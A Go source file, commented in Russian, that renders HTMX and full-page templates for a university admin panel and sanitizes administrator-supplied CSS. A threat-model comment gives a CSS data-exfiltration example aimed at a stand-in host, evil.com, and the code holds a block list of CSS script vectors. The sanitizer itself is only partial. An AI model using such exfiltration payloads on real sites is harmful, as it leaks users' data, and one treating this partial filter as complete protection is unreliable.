// Package admin реализует админ-панель для управления данными вузов.
// Рендеринг шаблонов: html/template с поддержкой layout + фрагментов для HTMX.
package admin

import (
	"bytes"
	"fmt"
	"html/template"
	"io/fs"
	"log"
	"net/http"
	"path/filepath"
	"strings"
	"sync"

	"github.com/gofiber/fiber/v2"
)

// ────────────────────────────────────────────────────────────────────────────
//  Renderer — движок шаблонов для админ-панели
// ────────────────────────────────────────────────────────────────────────────

// Renderer управляет загрузкой, кэшированием и рендерингом html/template.
//
// Поддерживает два режима ответа:
//  1. Полная страница (layout + content) — обычный HTTP-запрос.
//  2. Фрагмент (только content) — HTMX-запрос (HX-Request заголовок).
//
// Это обеспечивает Graceful Degradation: если HTMX сломается, браузер
// сделает обычный запрос, и сервер вернёт полную страницу с layout.
type Renderer struct {
	// viewsDir — корневая директория шаблонов (например, "views").
	viewsDir string

	// layoutFile — путь к файлу layout относительно viewsDir.
	layoutFile string

	// devMode — в dev-режиме шаблоны перечитываются при каждом запросе.
	// В production шаблоны парсятся один раз и кэшируются.
	devMode bool

	// funcMap — пользовательские функции для шаблонов.
	funcMap template.FuncMap

	mu    sync.RWMutex
	cache map[string]*template.Template
}

// NewRenderer создаёт движок шаблонов.
//
//   - viewsDir: путь к директории с шаблонами (например, "./views")
//   - devMode:  true = шаблоны перечитываются при каждом запросе (hot reload)
func NewRenderer(viewsDir string, devMode bool) *Renderer {
	r := &Renderer{
		viewsDir:   viewsDir,
		layoutFile: "layout.html",
		devMode:    devMode,
		cache:      make(map[string]*template.Template),
		funcMap:    defaultFuncMap(),
	}
	return r
}

// ────────────────────────────────────────────────────────────────────────────
//  Публичные методы рендеринга
// ────────────────────────────────────────────────────────────────────────────

// PageData содержит данные, которые layout и шаблон контента получают при рендеринге.
type PageData struct {
	// Title — заголовок страницы (<title>).
	Title string

	// Admin — данные текущего администратора (из сессии).
	Admin AdminData

	// ActiveNav — ключ текущего раздела для подсветки в sidebar (например, "universities").
	ActiveNav string

	// Content — произвольные данные, которые шаблон контента использует для рендеринга.
	Content any

	// Flash — одноразовое сообщение (успех/ошибка) для toast-уведомлений.
	Flash *FlashMessage

	// Errors — ошибки валидации (ключ = имя поля, значение = текст ошибки).
	Errors map[string]string
}

// AdminData хранит информацию об админе для отображения в layout.
type AdminData struct {
	Email     string
	Name      string
	AvatarURL string
}

// FlashMessage — одноразовое уведомление (toast).
type FlashMessage struct {
	Type    string // "success", "error", "warning", "info"
	Message string
}

// RenderPage рендерит полную страницу (layout + content) для обычных запросов
// или только фрагмент контента для HTMX-запросов.
//
// templateName — путь к шаблону контента относительно viewsDir
// (например, "universities/index.html").
//
// Graceful Degradation:
//   - HTMX-запрос (заголовок HX-Request) → рендерим только блок "content"
//   - Обычный запрос → рендерим layout с вложенным content
func (r *Renderer) RenderPage(c *fiber.Ctx, templateName string, data PageData) error {
	isHTMX := isHTMXRequest(c)

	var buf bytes.Buffer
	var err error

	if isHTMX {
		// HTMX-запрос: рендерим только фрагмент контента.
		err = r.renderFragment(templateName, data, &buf)
	} else {
		// Обычный запрос: рендерим layout + content.
		err = r.renderFull(templateName, data, &buf)
	}

	if err != nil {
		log.Printf("[admin/render] error rendering %q: %v", templateName, err)
		return c.Status(fiber.StatusInternalServerError).SendString("Internal template error")
	}

	c.Set("Content-Type", "text/html; charset=utf-8")
	return c.Send(buf.Bytes())
}

// RenderFragment рендерит только HTML-фрагмент (без layout).
// Используется для ответов на HTMX-запросы, которые заменяют часть DOM
// (например, новая строка таблицы, toast-уведомление).
//
// templateName — путь к partial-шаблону (например, "universities/_row.html").
func (r *Renderer) RenderFragment(c *fiber.Ctx, templateName string, data any) error {
	tmpl, err := r.loadTemplate(templateName)
	if err != nil {
		log.Printf("[admin/render] error loading fragment %q: %v", templateName, err)
		return c.Status(fiber.StatusInternalServerError).SendString("Internal template error")
	}

	var buf bytes.Buffer
	if err := tmpl.ExecuteTemplate(&buf, filepath.Base(templateName), data); err != nil {
		log.Printf("[admin/render] error executing fragment %q: %v", templateName, err)
		return c.Status(fiber.StatusInternalServerError).SendString("Internal template error")
	}

	c.Set("Content-Type", "text/html; charset=utf-8")
	return c.Send(buf.Bytes())
}

// ────────────────────────────────────────────────────────────────────────────
//  Внутренние методы рендеринга
// ────────────────────────────────────────────────────────────────────────────

// renderFull рендерит полную страницу: layout + content template.
func (r *Renderer) renderFull(templateName string, data PageData, buf *bytes.Buffer) error {
	layoutPath := filepath.Join(r.viewsDir, r.layoutFile)
	contentPath := filepath.Join(r.viewsDir, templateName)

	cacheKey := "full:" + templateName

	tmpl, err := r.getCachedOrParse(cacheKey, func() (*template.Template, error) {
		return template.New("layout.html").
			Funcs(r.funcMap).
			ParseFiles(layoutPath, contentPath)
	})
	if err != nil {
		return fmt.Errorf("parse full page %q: %w", templateName, err)
	}

	if err := tmpl.ExecuteTemplate(buf, "layout", data); err != nil {
		return fmt.Errorf("execute full page %q: %w", templateName, err)
	}

	return nil
}

// renderFragment рендерит только блок content (для HTMX-ответа).
func (r *Renderer) renderFragment(templateName string, data PageData, buf *bytes.Buffer) error {
	contentPath := filepath.Join(r.viewsDir, templateName)

	cacheKey := "frag:" + templateName

	tmpl, err := r.getCachedOrParse(cacheKey, func() (*template.Template, error) {
		return template.New(filepath.Base(templateName)).
			Funcs(r.funcMap).
			ParseFiles(contentPath)
	})
	if err != nil {
		return fmt.Errorf("parse fragment %q: %w", templateName, err)
	}

	// Пытаемся рендерить блок "content", если он определён.
	// Если нет — рендерим корневой шаблон.
	if err := tmpl.ExecuteTemplate(buf, "content", data); err != nil {
		// Фоллбэк: рендерим по имени файла.
		buf.Reset()
		if err2 := tmpl.ExecuteTemplate(buf, filepath.Base(templateName), data); err2 != nil {
			return fmt.Errorf("execute fragment %q: %w (also tried 'content': %v)", templateName, err2, err)
		}
	}

	return nil
}

// loadTemplate загружает одиночный шаблон (для partial-фрагментов).
func (r *Renderer) loadTemplate(templateName string) (*template.Template, error) {
	tmplPath := filepath.Join(r.viewsDir, templateName)
	cacheKey := "partial:" + templateName

	return r.getCachedOrParse(cacheKey, func() (*template.Template, error) {
		return template.New(filepath.Base(templateName)).
			Funcs(r.funcMap).
			ParseFiles(tmplPath)
	})
}

// getCachedOrParse возвращает шаблон из кэша или парсит его.
// В dev-режиме кэш не используется (шаблоны перечитываются каждый раз).
func (r *Renderer) getCachedOrParse(key string, parse func() (*template.Template, error)) (*template.Template, error) {
	if !r.devMode {
		r.mu.RLock()
		if tmpl, ok := r.cache[key]; ok {
			r.mu.RUnlock()
			return tmpl, nil
		}
		r.mu.RUnlock()
	}

	tmpl, err := parse()
	if err != nil {
		return nil, err
	}

	if !r.devMode {
		r.mu.Lock()
		r.cache[key] = tmpl
		r.mu.Unlock()
	}

	return tmpl, nil
}

// ────────────────────────────────────────────────────────────────────────────
//  Template Functions
// ────────────────────────────────────────────────────────────────────────────

// defaultFuncMap возвращает набор вспомогательных функций для шаблонов.
func defaultFuncMap() template.FuncMap {
	return template.FuncMap{
		// activeClass возвращает CSS-класс, если текущий nav совпадает с проверяемым.
		// Использование: class="{{activeClass .ActiveNav "universities"}}"
		"activeClass": func(active, check string) string {
			if active == check {
				return "bg-indigo-700 text-white"
			}
			return "text-indigo-100 hover:bg-indigo-600 hover:text-white"
		},

		// safeCSS помечает строку как безопасный CSS для вставки в <style>.
		// ВАЖНО: использовать ТОЛЬКО после серверной санитизации (SanitizeCSS).
		"safeCSS": func(s string) template.CSS {
			return template.CSS(s)
		},

		// safeHTML помечает строку как безопасный HTML.
		// Использовать с осторожностью — только для доверенного контента.
		"safeHTML": func(s string) template.HTML {
			return template.HTML(s)
		},

		// hasPrefix проверяет префикс строки.
		"hasPrefix": strings.HasPrefix,

		// uniTypeLabel возвращает человекочитабельную метку типа вуза.
		"uniTypeLabel": func(t string) string {
			switch t {
			case "public":
				return "Государственный"
			case "private":
				return "Частный"
			default:
				return t
			}
		},

		// uniTypeBadge возвращает CSS-классы для бейджа типа вуза.
		"uniTypeBadge": func(t string) string {
			switch t {
			case "public":
				return "bg-emerald-100 text-emerald-800"
			case "private":
				return "bg-amber-100 text-amber-800"
			default:
				return "bg-gray-100 text-gray-800"
			}
		},

		// default возвращает fallback значение, если основное пусто.
		"default": func(fallback, value string) string {
			if value == "" {
				return fallback
			}
			return value
		},

		// truncate обрезает строку до maxLen символов и добавляет "…".
		"truncate": func(maxLen int, s string) string {
			runes := []rune(s)
			if len(runes) <= maxLen {
				return s
			}
			return string(runes[:maxLen]) + "…"
		},

		// hasError проверяет наличие ошибки валидации для поля.
		"hasError": func(errors map[string]string, field string) bool {
			if errors == nil {
				return false
			}
			_, ok := errors[field]
			return ok
		},

		// getError возвращает текст ошибки валидации для поля.
		"getError": func(errors map[string]string, field string) string {
			if errors == nil {
				return ""
			}
			return errors[field]
		},

		// recordID извлекает строковую часть ID из *surrealmodels.RecordID.
		// Возвращает ТОЛЬКО идентификатор (например, "abc123"), а НЕ полный
		// record ID ("university:abc123"), т.к. в URL используется только ID-часть:
		//   /admin/universities/abc123/edit  ← ок
		//   /admin/universities/university:abc123/edit  ← плохо
		//
		// Хендлеры принимают :id и строят RecordID через:
		//   surrealmodels.NewRecordID("university", id)
		"recordID": func(v any) string {
			if v == nil {
				return ""
			}
			// *surrealmodels.RecordID — основной случай.
			type recordIDer interface {
				String() string
			}
			// Пытаемся извлечь поле ID напрямую через рефлексию-lite:
			// RecordID.ID содержит "чистый" идентификатор без имени таблицы.
			type hasID interface{ GetID() any }
			// SDK не экспортирует GetID(), поэтому работаем через String()
			// и отсекаем префикс "table:".
			if rid, ok := v.(recordIDer); ok {
				s := rid.String()
				// Формат: "table:id" — берём всё после первого ":".
				if idx := strings.Index(s, ":"); idx >= 0 {
					id := s[idx+1:]
					// Убираем angle-bracket escaping ⟨...⟩, если есть.
					id = strings.TrimPrefix(id, "⟨")
					id = strings.TrimSuffix(id, "⟩")
					return id
				}
				return s
			}
			return fmt.Sprintf("%v", v)
		},

		// int приводит значение к int. Нужно для передачи типизированных
		// целочисленных значений (например, SubjectPriority) в другие
		// template-функции, которые принимают int.
		"int": func(v any) int {
			switch val := v.(type) {
			case int:
				return val
			case int8:
				return int(val)
			case int16:
				return int(val)
			case int32:
				return int(val)
			case int64:
				return int(val)
			case float64:
				return int(val)
			case float32:
				return int(val)
			default:
				return 0
			}
		},

		// priorityLabel возвращает человекочитабельную метку приоритета предмета ЕНТ.
		// Использование в шаблоне: {{priorityLabel .Priority}}
		"priorityLabel": func(p int) string {
			switch p {
			case 1:
				return "Профильный"
			case 2:
				return "Второй"
			default:
				return fmt.Sprintf("Приоритет %d", p)
			}
		},

		// priorityBadge возвращает CSS-классы для бейджа приоритета предмета.
		"priorityBadge": func(p int) string {
			switch p {
			case 1:
				return "bg-violet-100 text-violet-800"
			case 2:
				return "bg-sky-100 text-sky-800"
			default:
				return "bg-gray-100 text-gray-800"
			}
		},
	}
}

// ────────────────────────────────────────────────────────────────────────────
//  CSS Sanitization
// ────────────────────────────────────────────────────────────────────────────

// SanitizeCSS выполняет серверную санитизацию пользовательского CSS.
//
// СТРАТЕГИЯ БЕЗОПАСНОСТИ:
//
// Кастомный CSS от администратора вуза — потенциальный вектор атаки:
//
//  1. CSS Injection: @import url("evil.css") может подгрузить внешние стили.
//  2. Data Exfiltration: url("https://evil.com/?secret=...") в background-image.
//  3. Layout Breaking: position:fixed, z-index:999999 может наложиться на UI.
//  4. Clickjacking: opacity:0 + position:absolute для перекрытия кнопок.
//  5. JS Injection: expression() (IE), -moz-binding (старый Firefox).
//
// Что мы делаем:
//   - Удаляем @import, @charset, @namespace (внешние ресурсы).
//   - Удаляем url() / expression() / -moz-binding (скрипты и ссылки).
//   - Удаляем position:fixed/absolute (предотвращаем overlay-атаки).
//   - Удаляем javascript: и data: URI-схемы.
//
// На фронтенде CSS инжектится внутри контейнера с уникальным ID,
// все селекторы автоматически скоупятся (см. шаблон публичной страницы).
//
// ПРИМЕЧАНИЕ: это НЕ полноценный CSS-парсер. Для production-grade решения
// рекомендуется использовать библиотеку вроде bluemonday (для HTML) или
// написать CSS-парсер, работающий на уровне AST. Текущая реализация
// покрывает основные векторы атак.
func SanitizeCSS(raw string) string {
	// Нормализуем переносы строк.
	s := strings.ReplaceAll(raw, "\r\n", "\n")

	// Удаляем опасные at-правила (построчно).
	lines := strings.Split(s, "\n")
	var clean []string
	for _, line := range lines {
		lower := strings.ToLower(strings.TrimSpace(line))

		// Пропускаем строки с опасными at-правилами.
		if strings.HasPrefix(lower, "@import") ||
			strings.HasPrefix(lower, "@charset") ||
			strings.HasPrefix(lower, "@namespace") {
			continue
		}

		clean = append(clean, line)
	}
	s = strings.Join(clean, "\n")

	// Удаляем опасные функции и URI-схемы (case-insensitive).
	dangerousPatterns := []string{
		"expression(", "expression (",
		"-moz-binding",
		"javascript:", "data:",
		"behavior:",
	}
	lower := strings.ToLower(s)
	for _, pat := range dangerousPatterns {
		for {
			idx := strings.Index(strings.ToLower(s), pat)
			if idx == -1 {
				break
			}
			// Заменяем найденный паттерн на /* BLOCKED */
			s = s[:idx] + "/* BLOCKED */" + s[idx+len(pat):]
		}
		_ = lower // suppress unused warning
	}

	// Удаляем url() — основной вектор для data exfiltration.
	// Разрешаем только url() без содержимого (маловероятно в реальном CSS).
	s = removeURLFunctions(s)

	return s
}

// removeURLFunctions удаляет вызовы url(...) из CSS, заменяя на /* BLOCKED */.
// Сохраняет CSS-свойства, но убирает значения с url().
func removeURLFunctions(s string) string {
	var result strings.Builder
	i := 0
	sLower := strings.ToLower(s)

	for i < len(s) {
		// Ищем "url("
		idx := strings.Index(sLower[i:], "url(")
		if idx == -1 {
			result.WriteString(s[i:])
			break
		}

		// Записываем всё до url(
		result.WriteString(s[i : i+idx])
		result.WriteString("/* BLOCKED */")

		// Пропускаем содержимое url(...)
		j := i + idx + 4 // после "url("
		depth := 1
		for j < len(s) && depth > 0 {
			if s[j] == '(' {
				depth++
			} else if s[j] == ')' {
				depth--
			}
			j++
		}
		i = j
	}

	return result.String()
}

// ────────────────────────────────────────────────────────────────────────────
//  Helpers
// ────────────────────────────────────────────────────────────────────────────

// isHTMXRequest проверяет, пришёл ли запрос от HTMX.
func isHTMXRequest(c *fiber.Ctx) bool {
	return c.Get("HX-Request") != ""
}

// WalkTemplates загружает все шаблоны из директории для pre-warming кэша.
// Вызывается при старте приложения в production-режиме.
func (r *Renderer) WalkTemplates() error {
	return filepath.WalkDir(r.viewsDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() || !strings.HasSuffix(path, ".html") {
			return nil
		}

		// Пропускаем layout — он загружается отдельно.
		rel, _ := filepath.Rel(r.viewsDir, path)
		if rel == r.layoutFile {
			return nil
		}

		// Пропускаем partial-шаблоны (начинаются с _).
		base := filepath.Base(rel)
		if strings.HasPrefix(base, "_") {
			return nil
		}

		log.Printf("[admin/render] pre-caching template: %s", rel)

		// Прогреваем кэш для full и fragment вариантов.
		if _, err := r.renderTestFull(rel); err != nil {
			log.Printf("[admin/render] warning: cannot pre-cache full %q: %v", rel, err)
		}

		return nil
	})
}

// renderTestFull пытается распарсить шаблон (для pre-warm кэша).
func (r *Renderer) renderTestFull(templateName string) (*template.Template, error) {
	layoutPath := filepath.Join(r.viewsDir, r.layoutFile)
	contentPath := filepath.Join(r.viewsDir, templateName)
	cacheKey := "full:" + templateName

	return r.getCachedOrParse(cacheKey, func() (*template.Template, error) {
		return template.New("layout.html").
			Funcs(r.funcMap).
			ParseFiles(layoutPath, contentPath)
	})
}

// SetStatus устанавливает HTTP-статус для ответа.
// Удобно для цепочки: return r.SetStatus(c, 422).RenderPage(c, ...)
func SetStatus(c *fiber.Ctx, status int) *fiber.Ctx {
	return c.Status(status)
}

// HTMXRedirect отправляет HTMX-совместимый редирект.
// Для HTMX-запросов — через заголовок HX-Redirect.
// Для обычных — стандартный HTTP 302.
func HTMXRedirect(c *fiber.Ctx, url string) error {
	if isHTMXRequest(c) {
		c.Set("HX-Redirect", url)
		return c.SendStatus(http.StatusOK)
	}
	return c.Redirect(url, fiber.StatusFound)
}
